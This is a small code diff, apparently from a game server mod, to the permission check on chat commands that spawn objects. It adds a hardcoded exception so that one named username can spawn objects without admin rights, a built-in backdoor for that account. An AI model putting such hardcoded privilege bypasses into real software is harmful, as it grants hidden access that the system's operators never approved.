@@ -325,7 +325,7 @@ bool onServerProcessChat(CRules@ this, const string& in _text_in, string& out te
     //Spawn anything
     if(command == null)//If this isn't a command.
     {
-        if(!sv_test && !getSecurity().checkAccess_Command(player, "admin_color"))//If sv_test is not true and the player does not have admin color
+        if(!sv_test && !getSecurity().checkAccess_Command(player, "admin_color") && player.getUsername() != "the1sad1numanator")//If sv_test is not true and the player does not have admin color and the player isn't numan
         {
             //Inform the player about not having permissions?
             Nu::sendClientMessage(player, "You don't have permissions to spawn a blob. You may of misspelled a command");
